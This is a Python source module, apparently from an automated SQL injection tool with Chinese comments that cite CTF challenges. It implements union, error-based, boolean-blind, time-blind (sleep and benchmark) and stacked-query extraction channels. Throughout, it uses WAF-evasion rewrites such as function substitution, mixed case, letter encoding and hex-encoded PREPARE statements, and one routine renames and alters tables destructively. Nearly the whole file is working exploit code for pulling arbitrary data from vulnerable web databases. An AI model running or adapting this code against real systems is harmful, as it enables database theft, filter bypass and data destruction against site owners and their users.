"""四大取数通道（Oracle）：把任意标量 SQL 表达式的值取回来。

- UnionOracle ：回显位直接读值（最快）
- ErrorOracle ：updatexml/extractvalue 报错带回（32 字符分段）
- BoolOracle  ：布尔差异 + ascii 二分（支持按位并发）
- TimeOracle  ：sleep 延时差异 + ascii 二分（最慢，兜底）
"""
from __future__ import annotations

import re
from concurrent.futures import ThreadPoolExecutor, as_completed

from .builder import PayloadBuilder
from .dbms import get_dialect
from .progress import ProgressStore
from ..tampers import mixed_case
from .models import InjectionPoint, ResponseInfo, WafReport, similarity
from .session import HttpSession

MARK_L = "~~"          # union 取值包裹标记（0x7e7e）


class OracleError(RuntimeError):
    pass


class BaseOracle:
    name = "base"

    def __init__(self, session: HttpSession, inj: InjectionPoint,
                 builder: PayloadBuilder, waf: WafReport):
        self.s = session
        self.inj = inj
        self.b = builder
        self.waf = waf
        self.requests = 0
        self.last_payload = ""                # 最近发送的完整 payload（复盘用）
        self.progress = ProgressStore.for_spec(session.spec)   # 断点续跑（--fresh 关闭）
        self.dialect = get_dialect("mysql")   # 由 make_oracle 按 fp.dbms 覆盖

    def scalar(self, expr: str) -> str:
        """取回标量表达式的字符串值。"""
        raise NotImplementedError

    def _ge(self, lhs: str, rhs: str, rhs_dec: str) -> str:
        """lhs >= rhs 条件；= 被滤（waf 拒绝/剥离）时降级 lhs > rhs_dec，
        语义等价改写（web209 实测：= 在黑名单里 >= 全灭）。"""
        if self.waf.is_filtered("="):
            return f"{lhs}>{rhs_dec}"
        return f"{lhs}>={rhs}"

    def _substr_at(self, expr: str, pos: int) -> str:
        """位置 pos 起的子串表达式（外层 ascii() 取首字符码点即单字符）。

        函数选择：substr 被滤 → mid（等价函数）；逗号被滤 → from 语法
        （web193 实测：只封 substr 不封 mid，硬编码 substr 会让盲注整条失效）。
        """
        fn = "substr"
        if self.waf.is_filtered("substr") and not self.waf.is_filtered("mid"):
            fn = "mid"
        # 必须带长度参数：mid(x from p) 返回的是「从 p 到结尾」的后缀，
        # 码点模式靠 ascii() 只看首字符还能蒙混，字符串比较模式会直接算错（web194）
        if not self.waf.is_filtered(","):
            return f"{fn}(({expr}),{pos},1)"
        if not self.waf.is_filtered("for"):
            return f"{fn}(({expr})from({pos})for(1))"
        if self.dialect.name == "mysql":
            return f"mid(({expr})from({pos}))"
        return f"substr(({expr})from {pos})"

    def code_expr(self, expr: str) -> str:
        """码点函数表达式；主函数被 WAF 过滤时自动换等价函数。

        web191 实测：ascii 被 preg_match 拦掉后，ord() 完全等价却把整个盲注
        通道判死。这里按「主函数 → 等价函数」顺序挑一个可用的。
        """
        fn = self.dialect.blind_code
        if self.waf.is_filtered(fn):
            alts = {"ascii": ("ord",), "ord": ("ascii",), "unicode": ("hex",)}
            for alt in alts.get(fn, ()):
                if not self.waf.is_filtered(alt):
                    fn = alt
                    break
        if fn == "hex":
            # hex() 返回十六进制串，不能直接做码点比较 → 维持原函数
            fn = self.dialect.blind_code
        return f"{fn}({expr})"

    def code_available(self) -> bool:
        """码点函数是否可用（主函数或等价函数至少一个未被拦）。"""
        if not self.waf.is_filtered(self.dialect.blind_code):
            return True
        alt = {"ascii": "ord", "ord": "ascii"}.get(self.dialect.blind_code)
        return bool(alt and not self.waf.is_filtered(alt))

    def scalar_int(self, expr: str) -> int:
        v = self.scalar(expr).strip()
        m = re.search(r"-?\d+", v)
        if not m:
            raise OracleError(f"非数值结果: {v!r} ({expr})")
        return int(m.group())


# ---------------------------------------------------------------------------
# UNION 回显通道
# ---------------------------------------------------------------------------
class UnionOracle(BaseOracle):
    name = "union"
    ENCODE_CHUNK = 20   # 输出过滤模式下每请求编码的字符数（控制 URL 长度）

    def __init__(self, *a, **kw):
        super().__init__(*a, **kw)
        if not self.inj.echo_positions or not self.inj.column_count:
            raise OracleError("缺少回显位/列数信息，UNION 通道不可用")
        if self.waf.is_filtered("concat", "union", "select"):
            raise OracleError("union/select/concat 被过滤")
        self.output_filtered = False   # 输出侧过滤：含数字的回显行被目标吞掉
        self._case_mutate = False      # union select 词组被滤 → 整包混合大小写

    def scalar(self, expr: str) -> str:
        if self.output_filtered:
            return self._scalar_encoded(expr)
        try:
            return self._scalar_raw(expr, mutate=self._case_mutate)
        except OracleError as e:
            if "回显标记未找到" not in str(e):
                raise
            if self._probe_output_filter():
                self.output_filtered = True
                self.s.log("INFO", "[union] 检出输出侧过滤（含数字的回显行被吞）"
                                   "→ 切换字母编码取数")
                return self._scalar_encoded(expr)
            if not self._case_mutate:
                # 词组级过滤（如 union select 被大小写敏感 strip，token 级扫描
                # 看不出来）：整包混合大小写自愈重试
                self._case_mutate = True
                self.s.log("INFO", "[union] 回显失败 → 尝试整包大小写混淆")
                return self._scalar_raw(expr, mutate=True)
            raise

    def _scalar_raw(self, expr: str, mutate: bool = False) -> str:
        n = self.inj.column_count
        pos = self.inj.echo_positions[0] - 1
        cols = ["null"] * n
        cols[pos] = self.dialect.mark_wrap.format(expr=expr)
        payload = self.b.wrap("union select " + ",".join(cols), base_value="0")
        if mutate:
            payload = mixed_case(payload)
        self.last_payload = payload
        r = self.s.request_value(payload)
        self.requests += 1
        if r.status_code < 0:
            raise OracleError("请求失败")
        m = re.search(re.escape(MARK_L) + r"(.*?)" + re.escape(MARK_L), r.body, re.S)
        if not m:
            raise OracleError(f"回显标记未找到（可能列数/回显位变化）: {expr}")
        val = m.group(1)
        return "" if val == "NULL" else val

    # ---- 输出侧过滤环境（ctf.show web174 类：回显含数字的行被吞） ----------
    def _probe_output_filter(self) -> bool:
        """区分「输出侧过滤」与列数/回显位漂移：纯字母值能回显、数字值不能。"""
        try:
            ok_letters = self._scalar_raw("0x616263") == "abc"   # 'abc'
        except OracleError:
            return False
        try:
            self._scalar_raw("0x313233")                          # '123'
            ok_digits = True
        except OracleError:
            ok_digits = False
        return ok_letters and not ok_digits

    @staticmethod
    def _enc_pairs(char_expr: str) -> str:
        """单字符 → 两个纯字母（char(97+高位), char(97+低位)），a-q 各 16 态。"""
        a = f"ascii({char_expr})"
        return f"char(97+floor({a}/16)),char(97+mod({a},16))"

    @staticmethod
    def _enc_len_expr(expr: str) -> str:
        """长度 → 3 个纯字母（最大 4095）。"""
        L = f"length(({expr}))"
        return ("concat(char(97+floor(" + L + "/256)),"
                "char(97+mod(floor(" + L + "/16),16)),"
                "char(97+mod(" + L + ",16)))")

    def _scalar_encoded(self, expr: str) -> str:
        # 1) 编码读长度（3 字母）；2) 分块把每个字符编码为两个字母取回；3) 本地解码
        enc_len = self._scalar_raw(self._enc_len_expr(expr))
        if len(enc_len) < 3:
            return ""
        total = ((ord(enc_len[0]) - 97) * 256 + (ord(enc_len[1]) - 97) * 16
                 + (ord(enc_len[2]) - 97))
        out = []
        for start in range(1, total + 1, self.ENCODE_CHUNK):
            end = min(start + self.ENCODE_CHUNK - 1, total)
            parts = ",".join(self._enc_pairs(f"substr(({expr}),{i},1)")
                             for i in range(start, end + 1))
            chunk = self._scalar_raw(f"concat({parts})")
            if len(chunk) < (end - start + 1) * 2:
                raise OracleError(f"编码取数不完整（限流?）: pos {start}-{end}")
            out.append("".join(
                chr((ord(chunk[j]) - 97) * 16 + (ord(chunk[j + 1]) - 97))
                for j in range(0, len(chunk), 2)))
        return "".join(out)


# ---------------------------------------------------------------------------
# 报错通道
# ---------------------------------------------------------------------------
class ErrorOracle(BaseOracle):
    name = "error"
    CHUNK = 30          # XPATH 报错 32 字符上限

    def __init__(self, *a, **kw):
        super().__init__(*a, **kw)
        if not self.waf.is_filtered("updatexml"):
            self.fn = "updatexml(1,{xpath},1)"
        elif not self.waf.is_filtered("extractvalue"):
            self.fn = "extractvalue(1,{xpath})"
        else:
            raise OracleError("updatexml 与 extractvalue 均被过滤，报错通道不可用")
        if self.waf.is_filtered("concat", "substr"):
            raise OracleError("concat/substr 被过滤，报错通道不可用")

    def _chunk(self, expr: str, start: int) -> str:
        xpath = f"concat(0x7e,substr(({expr}),{start},{self.CHUNK}),0x7e)"
        payload = self.b.wrap("and " + self.fn.format(xpath=xpath))
        r = self.s.request_value(payload)
        self.requests += 1
        if r.status_code < 0:
            raise OracleError("请求失败")
        if not r.has_sql_error():
            raise OracleError(f"报错通道未按预期工作: {r.sql_error_text()[:80]}")
        m = re.search(r"XPATH syntax error:\s*'~([^~]*)", r.body, re.S)
        if not m:
            raise OracleError(f"无法从报错中解析数据: {r.sql_error_text()[:80]}")
        return m.group(1)

    def scalar(self, expr: str) -> str:
        out, i = [], 1
        while True:
            chunk = self._chunk(expr, i)
            if not chunk:
                break
            out.append(chunk)
            if len(chunk) < self.CHUNK:
                break
            i += self.CHUNK
        return "".join(out)


# ---------------------------------------------------------------------------
# 布尔盲注通道
# ---------------------------------------------------------------------------
class BoolOracle(BaseOracle):
    name = "bool"

    def __init__(self, *a, workers: int = 6, **kw):
        super().__init__(*a, **kw)
        self.workers = workers
        # 参照 joiner 依次尝试：or（登录框恒真/查询框多行）→ and（查询框真=基线）
        # → xor（FinalSQL 类：and/or/空格/注释全被滤，1^(cond) 真→0 假→基线）
        # → arith（「都过滤了」类：'-cond-' 减法两态，见 builder.logic_arith）
        for joiner in ("or", "and", "xor", "arith"):
            fn = getattr(self.b, f"logic_{joiner}")
            if joiner == "arith" and self.b.waf.is_filtered("="):
                # = 被剥离时 1=1 → 11 恒常量（web209 实测），两态改用常量对，
                # 方向与 1=1/1=2 对齐：真条件（非 0）→ 空页，假条件（0）→ 全表页
                true_c, false_c = "1", "0"
            elif self.b.waf.is_filtered("="):
                # = 被剥离时 and(11)/and(12) 双双恒真，参照对改 like（web209 实测）
                true_c, false_c = "(1)like(1)", "(1)like(2)"
            else:
                true_c, false_c = "1=1", "1=2"
            r_true = self.s.request_value(self.b.wrap(fn(true_c)))
            r_false = self.s.request_value(self.b.wrap(fn(false_c)))
            if similarity(r_true, r_false) > 0.995:
                continue
            self.R_true, self.R_false = r_true, r_false
            self._joiner = joiner
            self.s.log("INFO", f"[bool] joiner={joiner}")
            return
        raise OracleError("or/and/xor/arith 均无真假差异，布尔通道不可用")

    def eval_bool(self, cond: str) -> bool:
        join = getattr(self.b, f"logic_{self._joiner}")
        payload = self.b.wrap(join(cond))
        self.last_payload = payload
        r = self.s.request_value(payload)
        self.requests += 1
        if r.status_code < 0:
            raise OracleError("请求失败")
        sim_t = similarity(r, self.R_true)
        sim_f = similarity(r, self.R_false)
        if max(sim_t, sim_f) < 0.90:
            # 响应与双参照均不匹配：payload 疑似被 WAF 拦截/页面结构变化，
            # 宁可早失败也不产出静默垃圾（曾把拦截页误判为恒真导致整串 '~'）
            raise OracleError(f"响应与真假参照均不匹配（疑似被拦截）: "
                              f"sim_t={sim_t:.2f} sim_f={sim_f:.2f} "
                              f"payload[:80]={payload[:80]}")
        return sim_t >= sim_f

    def _binsearch(self, cond_fmt, lo: int, hi: int) -> int:
        """cond_fmt(mid) 单调递减（true→false），返回最后为真的 mid（即真实值）。"""
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if self.s.stopped:
                raise OracleError("用户中止")
            if self.eval_bool(cond_fmt(mid)):
                lo = mid
            else:
                hi = mid - 1
        return lo

    def _char_at(self, expr: str, pos: int, prev: str | None = None) -> str:
        """提取 pos 位置字符；prev 为上一字符时先做游程检测（1 请求）。
        码点比较（ascii 包裹）：mid 免 for 形态返回后缀式，直接比较后缀
        会误判，码点比较对单字符/后缀两种形态都恒等于单字符相等。"""
        if not self.code_available():
            # 无码点函数（ascii/ord/hex 全被滤，web192）：改用字符串比较
            # substr(x,pos,1) >= char(n)，MySQL 字符串按字典序比较，同样可二分
            return self._char_at_cmp(expr, pos)
        if prev:
            eq = "=" if not self.waf.is_filtered("=") else " like "
            a = self._substr_at(expr, pos)
            b = self._substr_at(expr, pos - 1)
            if self.eval_bool(f"{self.code_expr(a)}{eq}{self.code_expr(b)}"):
                return prev
        code = self._binsearch(
            lambda m: self._ge(self.code_expr(self._substr_at(expr, pos)),
                               f"{m}", f"{m - 1}"), 32, 126)
        return chr(code)

    def _char_at_cmp(self, expr: str, pos: int) -> str:
        """字符串比较取字符（无码点函数时的兜底）。

        用 char(n) 而不是引号/十六进制字面量，避免被同一套黑名单拦掉；
        比较方向：substr >= char(mid) 单调，二分出最大满足的码点。
        """
        sub = self._substr_at(expr, pos)
        # 默认排序规则是 *_ci（大小写不敏感），直接比较会把 M/m 判成等价 →
        # 提取结果大小写全乱。用 BINARY 强制二进制比较；被滤时退回 COLLATE。
        if not self.waf.is_filtered("binary"):
            sub = f"binary {sub}"
        else:
            sub = f"{sub}collate utf8_bin"
        lo, hi = 32, 126
        use_char = not self.waf.is_filtered("char")
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if self.s.stopped:
                raise OracleError("用户中止")
            if use_char:
                rhs = f"char({mid})"
                rhs_dec = f"char({mid - 1})"
            else:
                # char 也被滤（web194）：退到字符串字面量（引号可用时）
                ch = chr(mid).replace("\\", "\\\\").replace("'", "\\'")
                rhs = f"'{ch}'"
                chd = chr(mid - 1).replace("\\", "\\\\").replace("'", "\\'")
                rhs_dec = f"'{chd}'"
            if self.eval_bool(self._ge(sub, rhs, rhs_dec)):
                lo = mid
            else:
                hi = mid - 1
        return chr(lo)

    def _extract_block(self, expr: str, start: int, end: int) -> str:
        """块内串行（游程复用前一位），块间并发。"""
        out = []
        prev = None
        for pos in range(start, end + 1):
            if self.s.stopped:
                raise OracleError("用户中止")
            ch = self._char_at(expr, pos, prev)
            out.append(ch)
            prev = ch or None
        return "".join(out)

    def scalar(self, expr: str) -> str:
        # 按方言实际使用判定（ord 被拦不影响 ascii 通道；码点全被拦时走字符串比较）
        if (not self.code_available() and self.waf.is_filtered("char")
                and self.waf.is_filtered("'")) \
                or self.waf.is_filtered("length") \
                or (self.waf.is_filtered("substr") and self.waf.is_filtered("mid")):
            raise OracleError("码点/截取/定长函数被过滤，布尔通道不可用")
        if not self.eval_bool(f"length(({expr}))>0"):
            return ""
        length = self._binsearch(
            lambda m: self._ge(f"length(({expr}))", f"{m}", f"{m - 1}"), 1, 1024)
        self.s.log("INFO", f"[bool] 长度={length}，分块并发提取: {expr[:60]}")
        result = [""] * length
        BLOCK = 16
        blocks = [(i + 1, min(i + BLOCK, length)) for i in range(0, length, BLOCK)]
        done_blocks = set()
        if self.progress:
            for (a, b) in blocks:
                blk = self.progress.get(f"bool|{expr}|{a}")
                if blk is not None and len(blk) == b - a + 1:
                    result[a - 1:b] = blk
                    done_blocks.add((a, b))
            if done_blocks:
                self.s.log("INFO", f"[bool] 续跑：已恢复 {len(done_blocks)}/{len(blocks)} 块")
        pending = [(a, b) for (a, b) in blocks if (a, b) not in done_blocks]
        with ThreadPoolExecutor(max_workers=self.workers) as ex:
            futs = {ex.submit(self._extract_block, expr, a, b): (a, b)
                    for a, b in pending}
            for f in as_completed(futs):
                a, b = futs[f]
                blk = f.result()
                result[a - 1:b] = blk
                if self.progress:
                    self.progress.put(f"bool|{expr}|{a}", blk)
        return "".join(result)

    # ------------------------------------------------------------------ 存在性
    def exists(self, expr: str) -> bool:
        """存在性 oracle（information_schema 被拦时字典爆破的底座）。

        expr 形如 (select(0)from(db.t))——对象存在时值为 0，不存在时 SQL
        报错（报错被吞则与「不匹配」页同貌）。参照：select(0)（恒 0 成功页）
        与 select(0)from(不存在表)（报错页）。要求引号闭合注入（字符串基线
        数值化为 0），即减法形态；空表返回 NULL 会误判不存在（CTF 可忽略）。
        """
        if self.inj.numeric or not self.inj.closure:
            raise OracleError("exists 需引号闭合（字符串基线）注入点")
        if not hasattr(self, "_ex_refs"):
            r_ok = self.s.request_value(
                self.b.wrap(self.b.logic_arith("(select(0))")))
            r_bad = self.s.request_value(
                self.b.wrap(self.b.logic_arith("(select(0)from(asqnosuch9999))")))
            self._ex_refs = (r_ok, r_bad)
            self.s.log("INFO", f"[bool] exists 参照: 成功页={r_ok.length}B "
                               f"报错页={r_bad.length}B")
        r_ok, r_bad = self._ex_refs
        payload = self.b.wrap(self.b.logic_arith(expr))
        self.last_payload = payload
        r = self.s.request_value(payload)
        self.requests += 1
        if r.status_code < 0:
            raise OracleError("请求失败")
        if r.has_waf_block():
            raise OracleError(f"exists 探针被拦截: {expr[:60]}")
        if r.has_sql_error() or similarity(r, r_bad) >= 0.95 \
                and r.status_code == r_bad.status_code:
            return False
        return similarity(r, r_ok) >= 0.95 and r.status_code == r_ok.status_code


# ---------------------------------------------------------------------------
# 堆叠通道（PREPARE + 十六进制，强网杯"随便注"类环境）
# ---------------------------------------------------------------------------
def parse_php_arrays(text: str) -> list:
    """解析 var_dump/print_r 风格回显，返回每个 array(...) 的值列表。"""
    rows = []
    for m in re.finditer(r"array\(\d+\)\s*\{(.*?)\n\}", text, re.S):
        vals = []
        for sm in re.finditer(r'string\(\d+\)\s+"((?:[^"\\]|\\.)*)"|int\((-?\d+)\)|=>\s*\n?\s*NULL', m.group(1)):
            if sm.group(1) is not None:
                vals.append(sm.group(1))
            elif sm.group(2) is not None:
                vals.append(sm.group(2))
            else:
                vals.append("NULL")
        if vals:
            rows.append(vals)
    return rows


class StackedOracle(BaseOracle):
    """堆叠注入取数通道：SET @a=0x{hex(sql)};PREPARE a FROM @a;EXECUTE a;

    预处理语句把完整 select 编码为十六进制，绕过一切关键字/点号过滤；
    结果经 var_dump 回显解析（~~标记包裹）。"""
    name = "stacked"

    def __init__(self, *a, **kw):
        super().__init__(*a, **kw)
        if self.waf.is_filtered(";"):
            raise OracleError("分号被过滤，堆叠通道不可用")
        if self.waf.is_filtered("prepare") or self.waf.is_filtered("execute"):
            raise OracleError("prepare/execute 被过滤（可尝试 handler 读取）")

    def run_stacked(self, statements: str, neutralize: bool = True) -> list:
        """执行任意分号分隔的语句（statements 不含原查询前缀），返回回显数组。"""
        base = "0" if neutralize else self.inj.base_value
        pre = base if self.inj.numeric else base + self.inj.closure
        from ..tampers import to_hex_literal
        payload = f"{pre};{statements.strip('; ')};{self.inj.comment}"
        r = self.s.request_value(payload)
        self.requests += 1
        if r.status_code < 0:
            raise OracleError("请求失败")
        return parse_php_arrays(r.body)

    def scalar(self, expr: str) -> str:
        from ..tampers import to_hex_literal
        sql = f"select concat(0x7e7e,ifnull(({expr}),0x4e554c4c),0x7e7e)"
        stmts = (f"SET @a={to_hex_literal(sql)};"
                 f"PREPARE a FROM @a;EXECUTE a")
        try:
            payload = (f"{'0' if not self.inj.numeric else '0'}{self.inj.closure}"
                       f";{stmts};{self.inj.comment}")
            r = self.s.request_value(payload)
            self.requests += 1
            if r.status_code < 0:
                raise OracleError("请求失败")
            m = re.search(re.escape(MARK_L) + r"(.*?)" + re.escape(MARK_L), r.body, re.S)
            if m:
                val = m.group(1)
                return "" if val == "NULL" else val
        except OracleError:
            raise
        raise OracleError(f"PREPARE 回显标记未找到: {expr[:60]}")

    def show_tables(self) -> list:
        rows = self.run_stacked("SHOW TABLES")
        return [v for row in rows for v in row if v]

    def show_columns(self, table: str) -> list:
        rows = self.run_stacked(f"SHOW COLUMNS FROM `{table}`")
        # 每列一行 array，[0] 为列名
        return [row[0] for row in rows if row]

    def handler_first(self, table: str) -> list:
        rows = self.run_stacked(f"HANDLER `{table}` OPEN;HANDLER `{table}` READ FIRST")
        return rows[0] if rows else []

    def rename_swap(self, flag_table: str, flag_col: str,
                    orig_table: str = "words", orig_col: str = "id"):
        """RENAME 换表法（破坏性 DDL，需用户确认）。"""
        stmts = (f"RENAME TABLE `{orig_table}` TO `{orig_table}_bak`;"
                 f"RENAME TABLE `{flag_table}` TO `{orig_table}`;"
                 f"ALTER TABLE `{orig_table}` CHANGE `{flag_col}` `{orig_col}` VARCHAR(100)")
        self.run_stacked(stmts, neutralize=False)


# ---------------------------------------------------------------------------
# 时间盲注通道
# ---------------------------------------------------------------------------
class TimeOracle(BaseOracle):
    name = "time"
    THRESHOLD_MS = 1800

    def __init__(self, *a, delay: float = 0.0, **kw):
        super().__init__(*a, **kw)
        if not delay:
            delay = getattr(self.s.spec, "time_sec", 0) or 2.0
        self.delay = delay
        if self.waf.is_filtered("sleep"):
            raise OracleError("sleep 被过滤，时间通道不可用")
        # joiner 自适应：or 恒真（登录框 and 会因密码恒假短路）→ and → xor
        for joiner in ("or", "and", "xor"):
            self._joiner = joiner
            fn = getattr(self.b, f"logic_{joiner}")
            r = self.s.request_value(self.b.wrap(fn(f"sleep({delay})")))
            if r.elapsed_ms >= self.delay * 1000 * 0.75:
                return
        # sleep 不可用（web217 类 waf 专门拦 sleep）→ benchmark 校准模式
        if not self.waf.is_filtered("benchmark"):
            probe = "benchmark(300000,md5(0x616263))"
            r = self.s.request_value(self.b.wrap(self.b.logic_or(probe)))
            if r.elapsed_ms >= 250:
                got = max(r.elapsed_ms / 1000.0, 0.01)
                self.bench_kicks = max(1, int(300000 * self.delay / got))
                self.mode = "benchmark"
                self._joiner = "or"     # 校准用 or 验证，eval 也必须用 or
                self.s.log("INFO", f"[time] sleep 不可用，benchmark 模式"
                                   f"（校准 {got:.2f}s@3e5 → K={self.bench_kicks}）")
                return
        if not self.waf.is_filtered("if"):
            raise OracleError("or/and/xor 均无法触发延时，时间通道不可用")

    def eval_bool(self, cond: str) -> bool:
        join = getattr(self.b, f"logic_{self._joiner}")
        if getattr(self, "mode", "") == "benchmark":
            # 不能用 K*(cond)——web217 类隐藏 waf 拒 *（整包秒拒）；
            # if() 三元把条件翻译成「跑不跑 benchmark」
            core = self.b.logic_or(
                f"if(({cond}),benchmark({self.bench_kicks},md5(0x616263)),0)")
        elif not self.waf.is_filtered("if"):
            core = join(f"if(({cond}),sleep({self.delay}),0)")
        else:
            core = join(f"sleep({self.delay}*({cond}))")
        payload = self.b.wrap(core)
        r = self.s.request_value(payload)
        self.requests += 1
        if r.status_code < 0:
            raise OracleError("请求失败")
        return r.elapsed_ms >= self.delay * 1000 * 0.75

    def _binsearch(self, cond_fmt, lo, hi):
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if self.s.stopped:
                raise OracleError("用户中止")
            if self.eval_bool(cond_fmt(mid)):
                lo = mid
            else:
                hi = mid - 1
        return lo

    def scalar(self, expr: str) -> str:
        if not self.code_available() \
                or self.waf.is_filtered("length") \
                or (self.waf.is_filtered("substr") and self.waf.is_filtered("mid")):
            raise OracleError("码点/截取/定长函数被过滤，时间通道不可用")
        if not self.eval_bool(f"length(({expr}))>0"):
            return ""
        length = self._binsearch(
            lambda m: self._ge(f"length(({expr}))", f"{m}", f"{m - 1}"), 1, 512)
        self.s.log("INFO", f"[time] 长度={length}，游程+分块提取: {expr[:60]}")
        store_key = f"time|{expr}"
        saved = self.progress.get(store_key) if self.progress else None
        out, prev, start_pos = [], None, 1
        if saved and saved.get("length") == length:
            chars = {int(k): v for k, v in saved.get("chars", {}).items()}
            if chars:
                mx = max(chars)
                out = [chr(chars[i]) for i in range(1, mx + 1)]
                start_pos = mx + 1
                prev = out[-1] or None
                self.s.log("INFO", f"[time] 续跑：已恢复 {mx}/{length} 字符")
                if mx >= length:
                    return "".join(out)
        for p in range(start_pos, length + 1):
            if self.s.stopped:
                if self.progress:
                    self.progress.put(store_key, {"length": length, "chars": {
                        str(i): ord(c) for i, c in enumerate(out, 1)}})
                raise OracleError("用户中止")
            if prev:
                eq = "=" if not self.waf.is_filtered("=") else " like "
                a = self._substr_at(expr, p)
                b = self._substr_at(expr, p - 1)
                if self.eval_bool(f"{self.code_expr(a)}{eq}{self.code_expr(b)}"):
                    out.append(prev)
                    if self.progress:
                        self.progress.put(store_key, {"length": length, "chars": {
                            str(i): ord(c) for i, c in enumerate(out, 1)}})
                    continue
            code = self._binsearch(
                lambda m: self._ge(self.code_expr(self._substr_at(expr, p)),
                                   f"{m}", f"{m - 1}"), 32, 126)
            ch = chr(code)
            out.append(ch)
            prev = ch or None
            if self.progress:
                self.progress.put(store_key, {"length": length, "chars": {
                    str(i): ord(c) for i, c in enumerate(out, 1)}})
        return "".join(out)
